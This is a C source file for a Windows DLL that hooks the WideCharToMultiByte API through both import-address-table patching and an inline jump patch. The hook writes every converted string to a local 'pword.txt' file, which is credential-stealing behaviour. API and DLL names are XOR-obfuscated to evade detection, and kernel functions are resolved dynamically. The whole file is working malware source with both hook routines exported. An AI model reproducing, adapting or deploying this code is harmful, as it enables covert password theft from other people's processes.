#include <Windows.h>

#include <stdio.h>

#define UTILS_IMPLEMENTATION
#include "../utils.h"

int(WINAPI *pWideCharToMultiByte)(UINT CodePage, DWORD dwFlags, LPCWCH lpWideCharStr, int cchWideChar, LPSTR lpMultiByteStr, int cbMultiByte, LPCCH lpDefaultChar, LPBOOL lpUseDefaultChar);
char OriginalBytes[14];

int HookedWideCharToMultiByteIAT(UINT CodePage, DWORD dwFlags, LPCWCH lpWideCharStr, int cchWideChar, LPSTR lpMultiByteStr, int cbMultiByte, LPCCH lpDefaultChar, LPBOOL lpUseDefaultChar)
{
    int iBytesWritten = pWideCharToMultiByte(CodePage, dwFlags, lpWideCharStr, cchWideChar, lpMultiByteStr, cbMultiByte, lpDefaultChar, lpUseDefaultChar);

    HANDLE hFile = pCreateFileA("C:\\Users\\someone\\pword.txt", FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE)
    {
        char str[128];
        sprintf(str, "%ws\n", lpWideCharStr);
        pWriteFile(hFile, str, iBytesWritten, NULL, NULL);
        pCloseHandle(hFile);
    }

    return iBytesWritten;
}

int HookedWideCharToMultiByteInlinePatch(UINT CodePage, DWORD dwFlags, LPCWCH lpWideCharStr, int cchWideChar, LPSTR lpMultiByteStr, int cbMultiByte, LPCCH lpDefaultChar, LPBOOL lpUseDefaultChar)
{
    if (!pWriteProcessMemory(pGetCurrentProcess(), (LPVOID)pWideCharToMultiByte, OriginalBytes, 14, NULL))
    {
        return 0;
    }

    int iBytesWritten = pWideCharToMultiByte(CodePage, dwFlags, lpWideCharStr, cchWideChar, lpMultiByteStr, cbMultiByte, lpDefaultChar, lpUseDefaultChar);

    HANDLE hFile = pCreateFileA("C:\\Users\\someone\\pword.txt", FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE)
    {
        char str[128];
        sprintf(str, "%ws\n", lpWideCharStr);
        pWriteFile(hFile, str, iBytesWritten, NULL, NULL);
        pCloseHandle(hFile);
    }

    return iBytesWritten;
}

__declspec(dllexport) int HookIAT()
{
    HMODULE hKernel = MyGetKernelModuleHandle();
    if (hKernel == NULL)
    {
        goto shutdown;
    }

    PopulateKernelFunctionPtrsByName(hKernel);

    char cWideCharToMultiByte[] = {0x67, 0x59, 0x54, 0x55, 0x73, 0x58, 0x51, 0x42, 0x64, 0x5f, 0x7d, 0x45, 0x5c, 0x44, 0x59, 0x72, 0x49, 0x44, 0x55, 0x0};
    MyXor(cWideCharToMultiByte, 19, key, 5);

    pWideCharToMultiByte = pGetProcAddress(hKernel, cWideCharToMultiByte);
    if (pWideCharToMultiByte == NULL)
    {
        goto shutdown;
    }

    char cDbgHelp[] = {0x54, 0x52, 0x57, 0x58, 0x55, 0x5c, 0x40, 0x1e, 0x54, 0x5c, 0x5c, 0x0};
    MyXor(cDbgHelp, 11, key, 5);

    HMODULE hDbgHelp = pLoadLibraryA(cDbgHelp);
    if (hDbgHelp == NULL)
    {
        goto shutdown;
    }

    char cImageDirectoryEntryToDataEx[] = {0x79, 0x5d, 0x51, 0x57, 0x55, 0x74, 0x59, 0x42, 0x55, 0x53, 0x44, 0x5f, 0x42, 0x49, 0x75, 0x5e, 0x44, 0x42, 0x49, 0x64, 0x5f, 0x74, 0x51, 0x44, 0x51, 0x75, 0x48, 0x0};
    MyXor(cImageDirectoryEntryToDataEx, 27, key, 5);

    PVOID(WINAPI * pImageDirectoryEntryToDataEx)
    (PVOID Base, BOOLEAN MappedAsImage, USHORT DirectoryEntry, PULONG Size, PIMAGE_SECTION_HEADER * FoundHeader) = pGetProcAddress(hDbgHelp, cImageDirectoryEntryToDataEx);

    ULONG size = 0;
    ULONG_PTR pBaseAddr = (ULONG_PTR)pGetModuleHandleA(NULL);

    PIMAGE_IMPORT_DESCRIPTOR pImageImportDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)pImageDirectoryEntryToDataEx((PVOID)pBaseAddr, TRUE, IMAGE_DIRECTORY_ENTRY_IMPORT, &size, NULL);

    ULONG ulDllIndex = 0;
    BOOL bDllFound = FALSE;

    MyXor(cKernel32, sCKernel32Len, key, 5);

    for (ulDllIndex = 0; ulDllIndex < size; ++ulDllIndex)
    {
        char *dllName = (char *)(pBaseAddr + pImageImportDescriptor[ulDllIndex].Name);

        if (MyStrCmpiAA(dllName, cKernel32))
        {
            bDllFound = TRUE;
            break;
        }
    }

    if (!bDllFound)
    {
        goto shutdown;
    }

    PROC ulWideCharToMultiByte = (PROC)pWideCharToMultiByte;

    PIMAGE_THUNK_DATA pImageThunkData = (PIMAGE_THUNK_DATA)(pBaseAddr + pImageImportDescriptor[ulDllIndex].FirstThunk);
    while (pImageThunkData->u1.Function)
    {
        PROC *ulFuncAddr = (PROC *)&pImageThunkData->u1.Function;
        if (*ulFuncAddr == ulWideCharToMultiByte)
        {
            DWORD dwOldProtect = 0;

            pVirtualProtect((LPVOID)ulFuncAddr, 4096, PAGE_READWRITE, &dwOldProtect);
            *ulFuncAddr = (PROC)HookedWideCharToMultiByteIAT;

            pVirtualProtect((LPVOID)ulFuncAddr, 4096, dwOldProtect, &dwOldProtect);

            return TRUE;
        }

        ++pImageThunkData;
    }

shutdown:
    return 0;
}

__declspec(dllexport) int HookInlinePatch()
{
    HMODULE hKernel = MyGetKernelModuleHandle();
    if (hKernel == NULL)
    {
        goto shutdown;
    }

    PopulateKernelFunctionPtrsByName(hKernel);
    char cWideCharToMultiByte[] = {0x67, 0x59, 0x54, 0x55, 0x73, 0x58, 0x51, 0x42, 0x64, 0x5f, 0x7d, 0x45, 0x5c, 0x44, 0x59, 0x72, 0x49, 0x44, 0x55, 0x0};
    MyXor(cWideCharToMultiByte, 19, key, 5);

    pWideCharToMultiByte = pGetProcAddress(hKernel, cWideCharToMultiByte);
    if (pWideCharToMultiByte == NULL)
    {
        goto shutdown;
    }

    if (!pReadProcessMemory(pGetCurrentProcess(), (LPVOID)pWideCharToMultiByte, OriginalBytes, 14, NULL))
    {
        goto shutdown;
    }

    FARPROC fpHookedFunc = (FARPROC)HookedWideCharToMultiByteInlinePatch;

    char patch[14] = {0};
    MyMemCpy(patch, "\xff\x25", 2);
    MyMemCpy(patch + 6, &fpHookedFunc, 8);

    if (!pWriteProcessMemory(pGetCurrentProcess(), (LPVOID)pWideCharToMultiByte, patch, 14, NULL))
    {
        goto shutdown;
    }

shutdown:
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hInstance, DWORD dwReason, LPVOID lpvReserved)
{
    switch (dwReason)
    {
    case DLL_PROCESS_ATTACH:
        // HookInlinePatch();
        // HookIAT();
        break;

    case DLL_PROCESS_DETACH:
        break;

    default:
        break;
    }

    return TRUE;
}
